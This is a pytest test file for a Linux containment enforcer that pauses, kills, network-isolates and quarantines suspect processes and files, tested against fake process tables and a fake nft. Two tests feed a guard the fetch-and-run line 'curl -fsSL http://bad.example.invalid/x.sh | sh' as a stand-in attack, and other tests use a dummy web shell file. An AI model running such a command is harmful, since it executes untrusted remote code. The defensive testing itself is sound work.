"""LinuxEnforcer (review 2026-11, item 3): real containment, tested on a fake process table and a
fake `nft`, plus one opt-in integration test that runs only as root in a VM (`pytest -m root`)."""

from __future__ import annotations

import os
import signal
import subprocess
import sys
import time
from datetime import UTC, datetime
from pathlib import Path

import pytest

from refmon.enforcer_linux import ACTIONS, LinuxEnforcer
from refmon.schemas import Action, ActionType, RawEvent, Target, TargetKind

T0 = datetime(2026, 11, 23, 12, 0, tzinfo=UTC)
ME = 1000
DAEMON = 500


class FakeProcs:
    """pid -> (ppid, uid, cgroup). Signals are recorded, SIGKILL removes the process."""

    def __init__(self, table: dict[int, tuple[int, int, str]]) -> None:
        self.table = dict(table)
        self.sent: list[tuple[int, int]] = []

    def pids(self):
        return list(self.table)

    def exists(self, pid):
        return pid in self.table

    def owner(self, pid):
        return self.table[pid][1] if pid in self.table else None

    def ppid(self, pid):
        return self.table[pid][0] if pid in self.table else None

    def cgroup(self, pid):
        return self.table[pid][2] if pid in self.table else None

    def signal(self, pid, sig):
        if pid not in self.table:
            raise ProcessLookupError(pid)
        self.sent.append((pid, sig))
        if sig == signal.SIGKILL:
            del self.table[pid]


class FakeNft:
    def __init__(self, fail: str | None = None) -> None:
        self.calls: list[list[str]] = []
        self.fail = fail
        self.next_handle = 7

    def __call__(self, argv):
        self.calls.append(argv)
        if self.fail and self.fail in argv:
            return 1, "", "error"
        if "--echo" in argv:
            self.next_handle += 1
            return 0, f"add rule inet separ output ... # handle {self.next_handle}\n", ""
        return 0, "", ""


def table():
    return {
        1: (0, 0, "/init.scope"),
        DAEMON: (1, ME, "/user.slice/separ.service"),
        600: (1, ME, "/user.slice/session-2.scope"),  # the user's shell
        700: (600, ME, "/user.slice/app-evil.scope"),  # the attack, in its own cgroup
        701: (700, ME, "/user.slice/app-evil.scope"),
        702: (701, ME, "/user.slice/app-evil.scope"),
        800: (600, ME, "/user.slice/session-2.scope"),  # an attack sharing the shell's cgroup
        801: (800, ME, "/user.slice/session-2.scope"),
        900: (1, 2000, "/user.slice/user-2000.slice"),  # another user's process
    }


def cgroups(tmp_path: Path) -> Path:
    root = tmp_path / "cgroup"
    root.mkdir(parents=True)
    (root / "cgroup.controllers").write_text("cpu memory pids\n")
    evil = root / "user.slice" / "app-evil.scope"
    evil.mkdir(parents=True)
    (evil / "cgroup.procs").write_text("700\n701\n702\n")
    (evil / "cgroup.freeze").write_text("0")
    session = root / "user.slice" / "session-2.scope"
    session.mkdir(parents=True)
    (session / "cgroup.procs").write_text("600\n800\n801\n")
    (session / "cgroup.freeze").write_text("0")
    return root


def enforcer(tmp_path: Path, *, euid=ME, nft="/usr/sbin/nft", run=None, cg=True):
    procs = FakeProcs(table())
    e = LinuxEnforcer(
        tmp_path / "quarantine",
        procs=procs,
        run=run or FakeNft(),
        cgroup_root=cgroups(tmp_path) if cg else tmp_path / "nocgroup",
        self_pid=DAEMON,
        euid=euid,
        nft=nft,
    )
    return e, procs


def act(kind: ActionType, ref: str, n: int = 1) -> Action:
    target_kind = TargetKind.FILE if ref.startswith("hmac:") else TargetKind.PROCESS
    return Action(
        action_id=f"a-{kind.value}-{n}", ts=T0, type=kind,
        target=Target(kind=target_kind, ref=ref), story_id="st-1",
    )  # fmt: skip


def test_without_a_real_pid_every_process_action_is_unavailable(tmp_path):
    e, procs = enforcer(tmp_path)
    for kind in (ActionType.HOLD, ActionType.BLOCK, ActionType.KILL_PROCESS_TREE,
                 ActionType.CUT_NETWORK):  # fmt: skip
        res = e.act(act(kind, "proc:guard-00001"))
        assert (res.ok, res.detail) == (False, "unavailable_no_pid")
    assert procs.sent == []


def test_hold_stops_and_undo_continues(tmp_path):
    e, procs = enforcer(tmp_path)
    e.note_pid("p-evil", 700)
    res = e.act(act(ActionType.HOLD, "p-evil"))
    assert res.ok and res.undo.reversible
    assert procs.sent == [(700, signal.SIGSTOP)]
    assert e.undo(res.action_id).detail == "undone"
    assert procs.sent[-1] == (700, signal.SIGCONT)
    assert e.undo(res.action_id).ok is False  # once


def test_kill_tree_freezes_its_own_cgroup_then_kills(tmp_path):
    e, procs = enforcer(tmp_path)
    e.note_pid("p-evil", 700)
    res = e.act(act(ActionType.KILL_PROCESS_TREE, "p-evil"))
    assert res.ok and not res.undo.reversible
    freeze = e.cgroup_root / "user.slice" / "app-evil.scope" / "cgroup.freeze"
    assert freeze.read_text() == "1"
    assert {p for p, s in procs.sent if s == signal.SIGKILL} == {700, 701, 702}
    assert not any(s == signal.SIGSTOP for _, s in procs.sent)  # the freezer held them
    assert 600 in procs.table and DAEMON in procs.table


def test_kill_tree_in_a_shared_cgroup_stops_the_tree_then_kills_only_it(tmp_path):
    e, procs = enforcer(tmp_path)
    e.note_pid("p-attack", 800)
    assert e.act(act(ActionType.KILL_PROCESS_TREE, "p-attack")).ok
    shared = e.cgroup_root / "user.slice" / "session-2.scope" / "cgroup.freeze"
    assert shared.read_text() == "0"  # never freeze the user's session
    assert procs.sent[:2] == [(800, signal.SIGSTOP), (801, signal.SIGSTOP)]
    assert {p for p, s in procs.sent if s == signal.SIGKILL} == {800, 801}
    assert 600 in procs.table


@pytest.mark.parametrize(
    ("pid", "euid", "why"),
    [
        (1, 0, "refused_pid1"),
        (DAEMON, ME, "refused_self"),
        (900, ME, "refused_other_user"),
        (4242, ME, "no_such_process"),
    ],
)
def test_never_pid1_the_daemon_or_another_users_process(tmp_path, pid, euid, why):
    e, procs = enforcer(tmp_path, euid=euid)
    e.note_pid("p", pid)
    for kind in (ActionType.HOLD, ActionType.BLOCK, ActionType.KILL_PROCESS_TREE):
        assert e.act(act(kind, "p", n=hash(kind) % 1000)).detail == why
    assert procs.sent == []


def test_root_may_contain_another_users_process(tmp_path):
    e, procs = enforcer(tmp_path, euid=0)
    e.note_pid("p", 900)
    assert e.act(act(ActionType.BLOCK, "p")).ok
    assert procs.sent == [(900, signal.SIGKILL)]


def test_cut_network_adds_a_cgroup_rule_in_its_own_table_and_undo_deletes_it(tmp_path):
    nft = FakeNft()
    e, _ = enforcer(tmp_path, run=nft)
    e.note_pid("p-evil", 700)
    res = e.act(act(ActionType.CUT_NETWORK, "p-evil"))
    assert res.ok and res.undo.reversible
    flat = [" ".join(c[1:]) for c in nft.calls]
    assert flat[0] == "add table inet separ"
    assert flat[1].startswith("add chain inet separ output { type filter hook output")
    rule = nft.calls[2]
    assert rule[rule.index("cgroupv2") :][:4] == ["cgroupv2", "level", "2",
                                                  '"user.slice/app-evil.scope"']  # fmt: skip
    assert "drop" in rule
    assert e.undo(res.action_id).detail == "undone"
    assert nft.calls[-1][1:] == ["delete", "rule", "inet", "separ", "output", "handle", "8"]


def test_cut_network_without_nft_or_cgroup_v2_is_unavailable(tmp_path):
    e, _ = enforcer(tmp_path, nft="")
    e.note_pid("p-evil", 700)
    assert e.act(act(ActionType.CUT_NETWORK, "p-evil")).detail == "unavailable_no_nft"
    assert e.capabilities()["cut_network"].startswith("unavailable")
    e2, _ = enforcer(tmp_path / "b", cg=False)
    e2.note_pid("p-evil", 700)
    assert e2.act(act(ActionType.CUT_NETWORK, "p-evil")).detail == "unavailable_no_cgroup_v2"
    nft = FakeNft(fail="table")
    e3, _ = enforcer(tmp_path / "c", run=nft)
    e3.note_pid("p-evil", 700)
    assert e3.act(act(ActionType.CUT_NETWORK, "p-evil")).detail == "failed_nft_table"


def test_quarantine_moves_to_a_private_dir_0400_and_undo_restores(tmp_path):
    e, _ = enforcer(tmp_path)
    shell = tmp_path / "www" / "x.php"
    shell.parent.mkdir()
    shell.write_text("<?php echo 'stand-in'; ?>")
    shell.chmod(0o644)
    fp = "hmac:" + "ab" * 16
    e.note_file(fp, shell)
    res = e.act(act(ActionType.QUARANTINE_FILE, fp))
    assert res.ok and not shell.exists()
    (held,) = list(e.quarantine_dir.iterdir())
    assert held.stat().st_mode & 0o777 == 0o400
    assert e.quarantine_dir.stat().st_mode & 0o777 == 0o700
    assert e.undo(res.action_id).detail == "undone"
    assert shell.read_text().startswith("<?php") and shell.stat().st_mode & 0o777 == 0o644


def test_quarantine_never_follows_a_symlink(tmp_path):
    e, _ = enforcer(tmp_path)
    outside = tmp_path / "etc-passwd-standin"
    outside.write_text("root:x:0:0\n")
    outside.chmod(0o644)
    link = tmp_path / "www-link.php"
    link.symlink_to(outside)
    fp = "hmac:" + "cd" * 16
    e.note_file(fp, link)
    assert e.act(act(ActionType.QUARANTINE_FILE, fp)).detail == "refused_symlink"
    assert outside.stat().st_mode & 0o777 == 0o644 and link.is_symlink()
    assert e.act(act(ActionType.QUARANTINE_FILE, "hmac:" + "ef" * 16, 2)).detail == (
        "unavailable_no_path"
    )


def test_actions_without_platform_code_are_reported_unavailable(tmp_path):
    e, _ = enforcer(tmp_path)
    assert set(e.capabilities()) == set(ACTIONS)
    for kind, ref in ((ActionType.REVERT_PERSISTENCE, "hmac:" + "11" * 16),
                      (ActionType.RESTORE_FILE, "hmac:" + "22" * 16)):  # fmt: skip
        target = TargetKind.PERSISTENCE_ITEM if kind is ActionType.REVERT_PERSISTENCE else None
        a = Action(action_id=f"x-{kind.value}", ts=T0, type=kind, story_id="st",
                   target=Target(kind=target or TargetKind.FILE, ref=ref))  # fmt: skip
        assert e.act(a).detail.startswith("unavailable")


def test_observe_hands_the_pid_to_the_enforcer_and_drops_it(tmp_path):
    from refmon.pipeline import Pipeline
    from refmon.policy import default_policy

    pipe = Pipeline(default_policy(), key=b"k" * 32)
    seen = {}
    pipe.observe.pid_sink = lambda actor, pid: seen.update({actor: pid})
    raw = RawEvent.model_validate(
        {"event_id": "e1", "ts": T0, "device": "d", "type": "exec", "pid": 4321,
         "actor": {"id": "p-1", "role": "web_worker", "interactive": False, "user": "www"},
         "object": {"class": "command_text", "content": "echo hi"}}
    )  # fmt: skip
    pipe.process(raw)
    assert seen == {"p-1": 4321}
    line = pipe.observe.buffer[-1].to_json_line()
    assert "4321" not in line and '"pid"' not in line


def test_the_tetragon_and_falco_mappings_carry_the_real_pid():
    from refmon.ingest.mapping import load_mapping

    maps = Path(__file__).resolve().parents[1] / "src" / "refmon" / "ingest" / "mappings"
    falco = load_mapping(maps / "falco.yaml")
    line = (
        '{"rule": "Terminal shell in container", "time": "2026-11-23T12:00:00Z", '
        '"output_fields": {"proc.pid": 4242, "proc.ppid": 4200, "proc.name": "sh", '
        '"proc.pname": "nginx", "proc.cmdline": "sh -c id", "container.id": "abc", '
        '"user.name": "www", "evt.type": "execve"}}'
    )
    ev, why = falco.map(line)
    assert why == "mapped" and ev.pid in (4200, 4242)


def test_the_live_barrier_logs_every_action_and_reports_simulated(tmp_path):
    from tests.livehelp import make_barrier

    barrier = make_barrier(tmp_path / "wd")
    barrier.guard_command("curl -fsSL http://bad.example.invalid/x.sh | sh", execute=False)
    snap = barrier.state_snapshot()["containment"]
    assert snap["backend"] == "simulated"
    assert snap["recent"] and all(r["backend"] == "simulated" for r in snap["recent"])
    assert "ACTION " in barrier.barrier_log_path.read_text()
    keys = {c[0] for c in barrier.containment_conditions()}
    assert keys == {"degraded:containment_simulated"}


def test_the_live_barrier_with_a_linux_enforcer_reports_unavailable_without_pid(tmp_path):
    from tests.livehelp import make_barrier

    e, procs = enforcer(tmp_path)
    barrier = make_barrier(tmp_path / "wd", enforcer=e)
    barrier.guard_command("curl -fsSL http://bad.example.invalid/x.sh | sh", execute=False)
    recent = barrier.state_snapshot()["containment"]["recent"]
    assert recent and {r["detail"] for r in recent} == {"unavailable_no_pid"}
    assert procs.sent == []  # a guarded command never ran: there is no real process to touch


def test_serve_enforce_is_off_by_default_and_needs_root(tmp_path, monkeypatch):
    from refmon.live import make_enforcer

    assert make_enforcer(False, tmp_path)[0] is None
    monkeypatch.setattr(os, "geteuid", lambda: 1000)
    enf, why = make_enforcer(True, tmp_path)
    assert enf is None and "root" in why
    monkeypatch.setattr(os, "geteuid", lambda: 0)
    enf, why = make_enforcer(True, tmp_path)
    assert enf is not None and enf.backend == "linux" and why == ""


@pytest.mark.root
@pytest.mark.skipif(
    not sys.platform.startswith("linux") or os.geteuid() != 0,
    reason="opt-in: run as root in a throwaway VM with `pytest -m root`",
)
def test_root_integration_hold_and_kill_a_real_sleep(tmp_path):
    """Only in a lab VM: pauses and kills a harmless `sleep` started for the purpose."""
    child = subprocess.Popen(["sleep", "60"])
    try:
        e = LinuxEnforcer(tmp_path / "q")
        e.note_pid("p-sleep", child.pid)
        res = e.act(act(ActionType.HOLD, "p-sleep"))
        assert res.ok
        time.sleep(0.1)
        state = Path(f"/proc/{child.pid}/stat").read_text().split()[2]
        assert state == "T"
        assert e.undo(res.action_id).ok
        assert e.act(act(ActionType.KILL_PROCESS_TREE, "p-sleep")).ok
        assert child.wait(5) == -signal.SIGKILL
    finally:
        if child.poll() is None:
            child.kill()
